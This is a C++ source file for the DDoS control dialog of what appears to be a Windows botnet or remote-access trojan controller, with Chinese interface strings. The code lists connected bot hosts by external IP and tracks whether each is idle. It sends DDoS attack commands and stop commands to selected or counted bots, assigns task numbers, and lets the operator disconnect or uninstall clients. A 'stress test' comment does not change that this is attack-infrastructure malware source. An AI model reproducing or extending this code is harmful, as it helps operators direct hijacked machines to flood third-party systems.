// DDOSAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Quick.h"
#include "DDOSAttackDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

CDDOSAttackDlg* p_CDDOSAttackDlg = NULL;//压力测试


extern ISocketBase* g_pSocketBase;
/////////////////////////////////////////////////////////////////////////////
// CDDOSAttackDlg dialog

IMPLEMENT_DYNCREATE(CDDOSAttackDlg, CXTPResizeFormView)

CDDOSAttackDlg::CDDOSAttackDlg()
	:  CXTPResizeFormView(IDD_ATTACK_DIALOG)
{
	m_nSortedCol = 1;
	m_bAscending = true;
	m_iocpServer = g_pSocketBase;
	p_CDDOSAttackDlg = this;
}

CDDOSAttackDlg::~CDDOSAttackDlg()
{
}

void CDDOSAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CXTPResizeFormView::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_DDOS_ATTACK, m_TabCtrl);
	DDX_Control(pDX, IDC_LIST_ATTACK, m_ClientList);
}


BEGIN_MESSAGE_MAP(CDDOSAttackDlg, CXTPResizeFormView)
	//{{AFX_MSG_MAP(CDDOSAttackDlg)
	ON_WM_SIZE()
	ON_NOTIFY(NM_RCLICK, IDC_LIST_ATTACK, OnRclickList)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_ATTACK, OnDblclkList)
	ON_NOTIFY(TCN_SELCHANGE, IDC_DDOS_ATTACK, OnSelchangeDdosAttack)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_DDOS_CLIENT, OnDDOSMessage)
END_MESSAGE_MAP()


#ifdef _DEBUG
void CDDOSAttackDlg::AssertValid() const
{
	CXTPResizeFormView::AssertValid();
}

#ifndef _WIN32_WCE
void CDDOSAttackDlg::Dump(CDumpContext& dc) const
{
	CXTPResizeFormView::Dump(dc);
}
#endif
#endif //_DEBUG


/////////////////////////////////////////////////////////////////////////////
// CDDOSAttackDlg message handlers

#define  ID_STATUS_UID 0x1300001

void CDDOSAttackDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
	TCHAR tzText[1024];

	va_list vlArgs;
	va_start(vlArgs, ptzFormat);
	wvsprintf(tzText, ptzFormat, vlArgs);
	va_end(vlArgs);

	m_wndStatusBar.SetText(tzText, iPane, 0);
}

VOID CDDOSAttackDlg::InitailizeStatus()
{
	m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM | CCS_TOP | SBARS_SIZEGRIP, CRect(0, 0, 0, 0), this, ID_STATUS_UID);
	CRect rect;
	m_wndStatusBar.GetClientRect(&rect);
	int a[3] = { rect.right / 3, (rect.right / 4) * 2 + 150, -1 };
	m_wndStatusBar.SetParts(3, a);

}


void CDDOSAttackDlg::OnInitialUpdate()
{
	CXTPResizeFormView::OnInitialUpdate();
	// TODO: Add extra initialization here
	static bool binit = false;

	if (!binit)
	{
		SetResize(IDC_LIST_ATTACK, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMLEFT);
		SetResize(IDC_DDOS_ATTACK, XTP_ANCHOR_TOPLEFT, XTP_ANCHOR_BOTTOMRIGHT);


	DWORD dwStyle = m_ClientList.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;
	dwStyle |= LVS_EX_GRIDLINES;
	dwStyle |= LVS_EX_CHECKBOXES;
	m_ClientList.SetExtendedStyle(dwStyle);


	m_ClientList.InsertColumn(0, _T("外网IP"), LVCFMT_LEFT, 140);
	m_ClientList.InsertColumn(1, _T("状态"), LVCFMT_LEFT, 65);

	HWND hWndHeader = m_ClientList.GetDlgItem(0)->GetSafeHwnd();
	m_heades.SubclassWindow(hWndHeader);
	m_heades.SetTheme(new CXTHeaderCtrlThemeOfficeXP());

	m_TabCtrl.InsertItem(0, _T("常规流量测试"));
	m_TabCtrl.InsertItem(1, _T("自定义模式"));
	m_TabCtrl.SetCurSel(0);

	m_WebAttack.Point = this;
	//m_WebAttack.ViewPoint = &m_ClientList;
	m_FlowAttack.Point = this;
	//m_FlowAttack.ViewPoint = &m_ClientList;
	m_WebAttack.Create(IDD_FLOWATTACK_DIALOG, GetDlgItem(IDC_DDOS_ATTACK));
	m_FlowAttack.Create(IDD_CUSTOMATTACK_DIALOG, GetDlgItem(IDC_DDOS_ATTACK));

	RECT TabRect;
	m_TabCtrl.GetClientRect(&TabRect);

	TabRect.top += 20;

	m_WebAttack.MoveWindow(&TabRect);
	m_WebAttack.ShowWindow(SW_SHOW);

	m_FlowAttack.MoveWindow(&TabRect);
	m_FlowAttack.ShowWindow(SW_HIDE);


	InitailizeStatus();
	StatusTextOut(0, _T("暂无任务"));
	CString Temp;
	Temp.Format(_T("当前在线主机 %d 台"), m_ClientList.GetItemCount());
	StatusTextOut(1, Temp.GetBuffer(0));


	binit = true;
	}



	return ;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CDDOSAttackDlg::OnSize(UINT nType, int cx, int cy)
{
	CXTPResizeFormView::OnSize(nType, cx, cy);

	// TODO: Add your message handler code here
	if (!IsWindowVisible()) return;
	RECT TabRect;
	GetClientRect(&TabRect);
	//m_TabCtrl.MoveWindow(&TabRect);
	TabRect.top += 20;
	TabRect.bottom -= 24;

	m_WebAttack.MoveWindow(&TabRect);
	m_FlowAttack.MoveWindow(&TabRect);

	TabRect.bottom += 40;
	m_wndStatusBar.MoveWindow(&TabRect);
}



void CDDOSAttackDlg::SortColumn(int iCol, bool bAsc)
{
	m_bAscending = bAsc;
	m_nSortedCol = iCol;
	CXTPSortClass csc(&m_ClientList, m_nSortedCol);
	csc.Sort(m_bAscending, xtpSortString);
}

BOOL CDDOSAttackDlg::OnNotify(WPARAM wParam, LPARAM lParam, LRESULT* pResult)
{
	HD_NOTIFY* pHDNotify = (HD_NOTIFY*)lParam;

	if (pHDNotify->hdr.code == HDN_ITEMCLICKA ||
		pHDNotify->hdr.code == HDN_ITEMCLICKW)
	{
		if (pHDNotify->iItem == m_nSortedCol)
			SortColumn(pHDNotify->iItem, !m_bAscending);
		else
			SortColumn(pHDNotify->iItem, m_heades.GetAscending() ? true : false);
	}

	return CXTPResizeFormView::OnNotify(wParam, lParam, pResult);
}


void CDDOSAttackDlg::OnSelchangeDdosAttack(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	switch (m_TabCtrl.GetCurSel())
	{
	case 0:
		m_WebAttack.ShowWindow(SW_SHOW);
		m_FlowAttack.ShowWindow(SW_HIDE);
		break;
	case 1:
		m_FlowAttack.ShowWindow(SW_SHOW);
		m_WebAttack.ShowWindow(SW_HIDE);
		break;
	}
	*pResult = 0;
}



afx_msg LRESULT CDDOSAttackDlg::OnDDOSMessage(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
		ClientContext* pContext = (ClientContext*)lParam;
	if (pContext->m_Dialog[0] == DDDOS_DLG_OUT)
	{
		DelClient(pContext);
	}
	else
	{
		AddClient(pContext);
	}

	
		return 0;
}

VOID CDDOSAttackDlg::DelClient(ClientContext* pContext)
{
	int nTabs = m_ClientList.GetItemCount();
	for (int n = 0; n < nTabs; n++)
	{
		ClientContext* pContext_OLD = (ClientContext*)m_ClientList.GetItemData(n);
		if (pContext == pContext_OLD)
		{
			pContext->m_Dialog[0] = 0;
			pContext->m_Dialog[1] = 0;
			m_ClientList.DeleteItem(n);
			break;
		}
	}
}

VOID CDDOSAttackDlg::AddClient(ClientContext* pContext)
{
	int i = m_ClientList.GetItemCount();
	m_ClientList.InsertItem(i, pContext->szAddress, 0);
	m_ClientList.SetItemText(i, 1, _T("空闲"));
	m_ClientList.SetItemData(i, (DWORD_PTR)pContext);
	pContext->m_Dialog[0] = DDDOS_DLG_IN;
	pContext->m_Dialog[1] = (int)this;;

}



WORD CDDOSAttackDlg::SendDDosAttackCommand(LPATTACK m_Attack, INT HostNums, WORD iTaskID)
{
	DWORD iCount = m_ClientList.GetItemCount();

	WORD nSize = sizeof(ATTACK);

	LPBYTE pData = new BYTE[nSize + 1];

	pData[0] = COMMAND_DDOS_ATTACK;//命令消息..
	ATTACK m_Send;
	memcpy(&m_Send, m_Attack, nSize);

	memcpy(pData + 1, &m_Send, nSize);


	WORD Count = 0;
	TCHAR szStatus[500] = { NULL };
	TCHAR szTask[20] = { NULL };
	wsprintf(szTask, _T("任务 %d"), iTaskID);

	//说明是选中主机
	if (HostNums == -1)
	{
		for (DWORD i = 0; i < iCount; i++)
		{
			if (m_ClientList.GetCheck(i))
			{
				//检查主机是否空闲状态
				m_ClientList.GetItemText(i, 1, szStatus, 500);
				if (lstrcmp(szStatus, _T("空闲")) == 0)
				{
					ClientContext* pContext = (ClientContext*)m_ClientList.GetItemData(i);
					// 发送DDOS 攻击命令
					m_iocpServer->Send(pContext, pData, nSize + 1);
					Count++;
					m_ClientList.SetItemText(i, 1, szTask);
				}
			}
		}
	}
	else
	{
		if (iCount < (DWORD)HostNums)
			HostNums = iCount;

		for (DWORD i = 0; i < (DWORD)HostNums; i++)
		{
			//检查主机是否空闲状态
			m_ClientList.GetItemText(i, 1, szStatus, 500);
			if (lstrcmp(szStatus, _T("空闲")) == 0)
			{
				ClientContext* pContext = (ClientContext*)m_ClientList.GetItemData(i);
				// 发送DDOS 攻击命令
				m_iocpServer->Send(pContext, pData, nSize + 1);
				Count++;
				m_ClientList.SetItemText(i, 1, szTask);
			}
		}
	}
	delete[]pData;



	return Count;
}



WORD CDDOSAttackDlg::SendDDostStopCommand(WORD iTaskID)
{
	DWORD iCount = m_ClientList.GetItemCount();
	WORD Count = 0;
	TCHAR szStatus[500] = { NULL };

	TCHAR szTask[20] = { NULL };
	wsprintf(szTask, _T("任务 %d"), iTaskID);

	BYTE pData[2] = { COMMAND_DDOS_STOP,0 };

	for (DWORD i = 0; i < iCount; i++)
	{
		//检查主机是否空闲状态
		m_ClientList.GetItemText(i, 1, szStatus, 500);
		if (lstrcmp(szStatus, szTask) == 0)
		{
			ClientContext* pContext = (ClientContext*)m_ClientList.GetItemData(i);
			// 发送DDOS 攻击命令
			m_iocpServer->Send(pContext, &pData[0], 2);
			Count++;
			m_ClientList.SetItemText(i, 1, _T("空闲"));
		}
	}
	return Count;
}

void CDDOSAttackDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult)
{


	CMenu menu;
	VERIFY(menu.CreatePopupMenu());
	menu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("卸载(&S)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 150, _T("选择(&S)"));
	menu.AppendMenu(MF_STRING | MF_ENABLED, 200, _T("取消(&S)"));
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&menu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 100:
	{
		if (m_ClientList.GetSelectedCount() < 1) return;
		int iItem;
		for (iItem = m_ClientList.GetItemCount() - 1; iItem >= 0; iItem--)
		{
			if (LVIS_SELECTED == m_ClientList.GetItemState(iItem, LVIS_SELECTED))     //发现选中行
			{
				ClientContext* p_ClientContext = (ClientContext*)m_ClientList.GetItemData(iItem);
				if (p_ClientContext)
				{
					p_ClientContext->m_Dialog[0] = 0;
					m_ClientList.DeleteItem(iItem);
					m_iocpServer->Disconnect(p_ClientContext);
					continue;
				}
			}
		}
	}
	break;

	case 150:
	{
		if (m_ClientList.GetSelectedCount() < 1) return;

		POSITION pos = m_ClientList.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_ClientList.GetNextSelectedItem(pos);
			m_ClientList.SetCheck(nItem, TRUE);
		}
	}
	break;
	case 200:
	{
		if (m_ClientList.GetSelectedCount() < 1) return;
		POSITION pos = m_ClientList.GetFirstSelectedItemPosition();
		while (pos)
		{
			int	nItem = m_ClientList.GetNextSelectedItem(pos);
			m_ClientList.SetCheck(nItem, FALSE);
		}
	}
	break;
	default:
		break;
	}
	CString Temp;
	Temp.Format(_T("当前在线主机 %d 台"), m_ClientList.GetItemCount());
	StatusTextOut(1, Temp.GetBuffer(0));

	menu.DestroyMenu();
	*pResult = 0;
}

void CDDOSAttackDlg::OnDblclkList(NMHDR* pNMHDR, LRESULT* pResult)
{
	POSITION pos = m_ClientList.GetFirstSelectedItemPosition();
	while (pos)
	{
		int	nItem = m_ClientList.GetNextSelectedItem(pos);

		m_ClientList.SetCheck(nItem, m_ClientList.GetCheck(nItem)?FALSE:TRUE );
	}

}